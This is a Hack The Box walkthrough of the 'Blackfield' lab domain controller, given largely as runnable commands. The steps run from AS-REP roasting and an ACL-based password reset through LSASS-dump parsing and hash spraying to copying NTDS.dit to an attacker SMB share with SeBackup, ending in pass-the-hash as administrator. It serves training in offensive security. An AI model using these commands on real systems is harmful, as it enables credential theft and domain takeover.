@@ -1,0 +1,278 @@
+Blackfield
+
+28th September 2020 / Document No D20.100.89
+Prepared By: cube0x0
+Machine Author(s): aas
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Backfield is a hard difficulty Windows machine featuring Windows and Active Directory
+misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once
+user is found to have Kerberos pre-authentication disabled, which allows us to conduct an
+ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the
+AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext
+password. With this user we can access an SMB share containing forensics artefacts, including an
+lsass process dump. This contains a username and a password for a user with WinRM privileges,
+who is also a member of the Backup Operators group. The privileges conferred by this privileged
+group are used to dump the Active Directory database, and retrieve the hash of the primary
+domain administrator.
+
+Skills Required
+
+      Basic Knowledge of Windows
+      Basic Knowledge of Active Directory
+
+Skills Learned
+
+      Leveraging Backup Operators group membership
+      Dumping credentials from LSASS
+      Anonymous / Guest Enumeration
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.192 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.192
+
+The scan reveals many ports open, including port 53 (DNS), 389 (LDAP) and 445 (SMB). This
+reveals that the server is a domain controller for the BLACKFIELD.LOCAL domain.
+Foothold
+
+Attempting anonymous and guest enumeration of SMB shares reveals a non-default share
+named profiles$ . There is also another non-default share called forensic that we don't have
+access to.
+
+   smbmap -u guest -H 10.10.10.192
+
+Inspecting the profiles$ share reveals a list of user profile or document folders. A list of all
+usernames can be generated using smbclient -N \\\\10.10.10.192\\profiles$ -c ls | awk
+'{ print $1 }' , and saved to users.txt.
+
+With a user list and the Kerberos port open, we can try to spray the users Impacket's
+GetNpUsers.py in order to see if any user has Kerberos pre-authentication disabled.
+
+   GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip
+   10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
+After saving the hash to a file called hash , we can attempt to crack it using John the Ripper with
+the rockyou wordlist.
+
+   john hash --format=krb5asrep
+
+This is successful, and the password is revealed to be #00^BlackKnight . With a domain account,
+we can proceed to enumerate Active Directory using bloodhound-python. If we run bloodhound-
+python with the -ns parameter there will be no need to change the DNS setting on our vm. First,
+we install bloodhound ingestor using apt (which also installs the neo4j database server), then the
+data collector with pip3. We can then execute the collector against the target by issuing the
+bloodhound-python command below.
+
+   apt install bloodhound
+   pip3 install bloodhound
+   bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns
+   10.10.10.192 -c DcOnly
+
+When running neo4j for the first time we must create the log directory and file, and then proceed
+go login to http://localhost:7474/ with the credentials neo4j / neo4j , and then set a new
+password.
+
+   mkdir -p /usr/share/neo4j/logs
+   touch /usr/share/neo4j/logs/neo4j.log
+   neo4j start
+Then we can start BloodHound with bloodhound and login with the username neo4j and our
+new password. When signed into the BloodHound GUI, we can drag and drop the bloodhound-
+python output in order to import the data.
+Start the BloodHound analysis by searching for the support user, right-clicking it and marking it
+as owned. Let's examine if this account has any further object control that we can leverage. If we
+search for first degree object control we get a hit.
+Click Raw Query at the bottom, and type in the following Cypher query:
+
+   MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
+Our support user has the password change permission on the audit2020 user.
+
+To abuse this, we can use rpcclient to set the password.
+   rpcclient -U blackfield/support 10.10.10.192
+   rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
+
+After enumerating the SMB shares using CrackMapExec as audit2020 , it's seen that we now
+have access to the forensic share.
+
+   apt install -y crackmapexec
+   cme smb 10.10.10.192 -u audit2020 -p 'H@CKTHEB0X#' --shares
+We connect to the forensic share and see a zipped lsass memory dump. LSASS is short for Local
+Security Authority Subsystem Service, and it stores credentials in memory on behalf of a user
+that has an active (or recently active) session. This allows the user to access network resources
+without re-typing their credentials for each service. LSASS may store credentials in multiple
+forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI
+keys,and Smartcard PIN.
+
+Credentials are stored in LSASS for sessions that have been established since the last reboot and
+have not been closed. For example, credentials are created in memory when a user does any of
+the following (this is not an exhaustive list).
+
+      Logs on to a local session or RDP session on the computer.
+      Runs a process using RunAs.
+      Runs an active Windows service on the computer.
+      Creates a scheduled task or batch job.
+      Runs PsExec with explicit creds, such as PsExec \\server -u user -p pwd cmd .
+      Uses WinRM with CredSSP.
+
+So we download the lsass process memory dump locally for further inspection.
+
+   smbclient.py audit2020:'H@CKTHEB0X#'@10.10.10.192
+   use forensic
+   cd memory_analysis
+   ls
+   get lsass.zip
+   exit
+After unzipping lsass.zip we can use Pypykatz on the extracted lsass.DMP file to retrieve NT
+hashes.
+
+   pip3 install pypykatz
+   pypykatz lsa minidump lsass.DMP
+
+Before spraying these credentials against the server, let's check the account lockout policy.
+   ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -p 389 -h 10.10.10.192 -
+   b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold
+The password policy has a lockoutThreshold of 0, which means we can attempt an unlimited
+number of passwords without locking the account out (although this is quite noisy). We can
+extract all usernames and hashes from the lsass dump and save them as hashes and users
+respectively, and spray with CrackMapExec in order to discover a combination.
+
+   pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u >
+   hashes
+   pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -
+   u > users
+   cme smb 10.10.10.192 -u users -H hashes
+
+This was successful, and we found a working combination:
+svc_backup:9658d1d1dcd9250115e2205d9f48400d .
+WinRM is enabled and we can gain a PowerShell session using Evil-WinRM. The command whoami
+/priv reveals that svc_backup that has the SeBackup privilege.
+
+   evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+Privilege Escalation
+
+We can abuse the SeBackup privilege in order to retrieve files from the Administrator Desktop
+using robocopy. Using robocopy, we are able to retrieve a notes.txt but are denied access on
+root.txt.
+
+   robocopy /b C:\Users\Administrator\Desktop\ C:\
+
+By reading the notes.txt file, we understand the root.txt flag is encrypted (probably with EFS),
+which is blocking our access with robocopy.
+
+Dumping Hashes with WBAdmin
+
+So we need to get into the Administrator context. On way to do this is to abuse SeBackup and
+SeRestore privileges in order to dump the AD database. Then, we can use the administrator
+NTLM hash in a PtH (Pass the Hash) attack to get a shell as them. First we need to install and
+configure a samba server with authentication.
+Modify the contents of /etc/samba/smb.conf to the following:
+
+[global]
+              map to guest = Bad User
+              server role = standalone server
+              usershare allow guests = yes
+              idmap config * : backend = tdb
+              interfaces = tun0
+              smb ports = 445
+
+[smb]
+
+       comment = Samba
+       path = /tmp/
+       guest ok = yes
+       read only = no
+       browsable = yes
+       force user = smbuser
+
+Create a new user that matches the user in the force user parameter.
+
+adduser smbuser
+
+Next, create a password for our newly created user.
+
+smbpasswd -a smbuser
+
+Then start the SMB demon with service smbd restart . In our Win-Rm session we can mount
+the share:
+
+net use k: \\10.10.14.3\smb /user:smbuser smbpass
+
+On the Win-Rm shell, we can backup the NTDS folder with wbadmin.
+
+   echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.3\smb -
+   include:c:\windows\ntds
+Next, retrieve the version of the backup.
+   wbadmin get versions
+
+We can now restore the NTDS.dit file, specifying the backup version.
+   echo "Y" | wbadmin start recovery -version:10/01/2020-14:23 -itemtype:file -
+   items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+
+We need to export the system hive too, and transfer both this and the NTDS.dit to our local
+machine.
+
+   reg save HKLM\SYSTEM C:\system.hive
+
+Copy the files to our box via our mounted SMB drive.
+   cp ntds.dit \\10.10.14.3\smb\NTDS.dit
+   cp system.hive \\10.10.14.3\smb\system.hive
+
+Next, we can extract all the hashes in the domain using Impacketsecretsdump.py.
+   secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
+With the primary domain administrator hash, we can use wmiexec to get a shell (if we use psexec,
+the Administrator security context will not be preserved, and we will be NT AUTHORITY SYSTEM,
+which will not allow us to decrypt the file).
+
+   wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192
+
+Alternative way to dump hashes
+
+We start off by creating a file called cmd with the following content and place it in the
+C:\windows\temp\ folder
+
+   set context persistent nowriters
+   add volume c: alias temp
+   create
+   expose %temp% h:
+   exit
+We then execute it using diskshadow /s cmd to create a shadow volume accessible via the H:
+drive.
+In Evil-WinRM we upload SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll
+from the SeBackupPrivilege GitHub repo, which will allow us to copy files from the newly
+exposed shadow copy (H:).
+
+   upload SeBackupPrivilegeUtils.dll
+   upload SeBackupPrivilegeCmdLets.dll
+Next, import the .dll files and invoke the Copy-FileSeBackupPrivilege cmdlet on ntds.dit and
+system .
+   import-module .\SeBackupPrivilegeCmdLets.dll
+   import-module .\SeBackupPrivilegeUtils.dll
+   Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -
+   Overwrite
+   Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM
+   c:\windows\temp\SYSTEM -Overwrite
+
+Download the saved files with Evil-WinRM.
+   download system
+   download ntds
+
+Then run secretsdump, specifying the LOCAL parameter to extract the hashes from the NTDS.dit.
+
+   secretsdump.py -ntds ntds -system system LOCAL
+
+If this wasn't a domain controller, there would be no NTDS.dit file to get passwords from, so we
+would need to download the SYSTEM, SAM and SECURITY files instead:
+
+   Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM
+   c:\windows\temp\SYSTEM -Overwrite
+   Copy-FileSeBackupPrivilege h:\windows\system32\config\SECURITY
+   c:\windows\temp\SECURITY -Overwrite
+   Copy-FileSeBackupPrivilege h:\windows\system32\config\SAM c:\windows\temp\SAM -
+   Overwrite
+
+From these files we can extract LSA secrets, the machine account and local user hashes using
+secretsdump.
+
+   secretsdump.py -security security -sam sam -system system LOCAL
+
